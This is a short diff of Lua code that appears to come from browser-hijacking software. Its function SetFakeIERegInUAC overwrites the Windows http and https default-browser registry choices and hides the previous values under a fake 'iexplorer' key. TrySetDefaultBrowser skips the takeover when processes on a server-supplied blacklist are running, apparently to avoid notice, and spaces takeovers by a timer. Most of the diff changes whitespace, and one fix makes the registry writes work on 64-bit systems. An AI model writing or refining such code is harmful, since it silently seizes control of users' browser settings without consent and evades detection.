@@ -256,7 +256,7 @@ function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 	if type(tDefaultBrowser) ~= "table" then
 		return false
 	end
-	
+
 	if not bIgnoreSpanTime then
 		local nSpanTimeInSec = tDefaultBrowser["nSpanTimeInSec"] or 0
 		local nLastSetDefaultUTC = tUserConfig["nLastSetDefaultUTC"] or 0
@@ -266,14 +266,14 @@ function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 			return false
 		end
 	end
-	
+
 	local strBlackList = tDefaultBrowser["strBlackList"] or ""
 	local bPassCheck = CheckProcessList(strBlackList)
 	if not bPassCheck then
 		FunctionObj.TipLog("[TrySetDefaultBrowser] CheckProcessList failed")
 		return false
 	end
-		
+
 	local strBrowserList = tDefaultBrowser["strBrowserList"] or ""
 	local bPassCheck = CheckBrowserList(strBrowserList)
 	if not bPassCheck then
@@ -434,7 +434,7 @@ function SetFakeIERegInUAC(strCommand)
 	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
 	local strRegValue = tFunHelper.RegQueryValue(strRegPath)
 	if strRegValue ~= strProgID then
-		tFunHelper.RegSetValue(strRegPath, strProgID)
+		tFunHelper.RegSetValue(strRegPath, strProgID, bIs64)
 		tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPProgid", strRegValue, bIs64)
 		bRefresh = true
 	end
@@ -442,7 +442,7 @@ function SetFakeIERegInUAC(strCommand)
 	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\https\\UserChoice\\Progid"
 	local strRegValue = tFunHelper.RegQueryValue(strRegPath)
 	if strRegValue ~= strProgID then
-		tFunHelper.RegSetValue(strRegPath, strProgID)
+		tFunHelper.RegSetValue(strRegPath, strProgID, bIs64)
 		tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPSProgid", strRegValue, bIs64)
 		bRefresh = true
 	end
